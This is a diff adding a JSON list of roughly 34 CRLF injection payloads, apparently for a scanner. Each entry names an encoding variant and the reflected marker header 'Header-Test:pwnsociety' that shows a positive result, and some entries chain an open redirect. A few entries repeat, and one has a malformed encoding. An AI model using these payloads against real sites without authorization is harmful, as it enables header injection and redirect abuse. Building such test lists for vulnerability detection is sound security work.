@@ -1,0 +1,171 @@
+[{
+		"name": "CRLF Injection with %0A",
+		"payload": "%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0A%20",
+		"payload": "%0A%20Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %20%0A",
+		"payload": "%20%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %23%0A",
+		"payload": "%23%OAHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
+		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0A",
+		"payload": "%E5%98%8A%E5%98%8D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %3F%0A",
+		"payload": "%3F%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0D",
+		"payload": "%0DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0D%20",
+		"payload": "%0D%20Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %20%0D",
+		"payload": "%20%0DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %23%0D",
+		"payload": "%23%0DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %23%0A",
+		"payload": "%23%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
+		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0D",
+		"payload": "%E5%98%8A%E5%98%8D%0DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0D%0A",
+		"payload": "%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0D%0A%20",
+		"payload": "%0D%0A%20Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %20%0D%0A",
+		"payload": "%20%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %23%0D%0A",
+		"payload": "%23%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with \\r\\n",
+		"payload": "\\r\\nHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with suffix space \\r\\n",
+		"payload": " \\r\\n Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with \\r\\n",
+		"payload": "\\r\\n Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %5cr%5cn",
+		"payload": "%5cr%5cnHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D",
+		"payload": "%E5%98%8A%E5%98%8DHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %E5%98%8A%E5%98%8D%0D%0A",
+		"payload": "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %0D%0A%09",
+		"payload": "%0D%0A%09Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %250A",
+		"payload": "%250AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %25250A",
+		"payload": "%25250AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %%0A0A",
+		"payload": "%%0A0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %25%30A",
+		"payload": "%25%30AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %25%30%61",
+		"payload": "%25%30%61Header-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with %u000A",
+		"payload": "%u000AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with open redirect chain %2F%2E%2E%0D%0A",
+		"payload": "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with open redirect chain %2E%2E%2F%0D%0A",
+		"payload": "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	},
+	{
+		"name": "CRLF Injection with open redirect chain %2F..%0D%0A",
+		"payload": "/google.com/%2F..%0D%0AHeader-Test:pwnsociety",
+		"response": "Header-Test:pwnsociety"
+	}
+]
